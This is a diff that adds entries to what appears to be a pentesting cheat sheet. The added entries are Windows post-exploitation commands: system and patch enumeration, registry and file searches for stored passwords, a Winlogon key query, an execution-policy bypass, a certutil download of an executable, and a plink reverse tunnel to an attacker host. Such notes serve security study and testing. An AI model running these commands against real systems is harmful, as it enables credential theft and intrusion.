@@ -170,4 +170,22 @@ nc -v 127.0.0.1 1337
 - $web2 = Invoke-WebRequest -uri "$site"
 - $web2.links.href | select-string http://
 -------------------
-
+- systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
+- wmic qfe
+- wmic qfe get Caption,Description,HotFixID,InstalledOn
+- wmic logicaldisk
+- wmic logicaldisk get caption,description,providername
+- arp -a
+- netstat -ano
+- c:\windows\System32> findstr /si password *.txt *.ini *.config
+- sc query windefend
+- sc queryex type= service
+- netsh advfirewall firewall dump
+- netsh firewall show state
+- netsh firewall show config
+- powershell -ep bypass
+- reg query HKLM /f password /t REG_SZ /s
+- reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+- certutil -urlcache -f https:/www.aaa/arquivo.exe arquivo.exe
+- python2 -m SimpleHTTPServer 9090
+- plink.exe -l root -pw toor -R 445:127.0.0.1:445 10.0.0.5
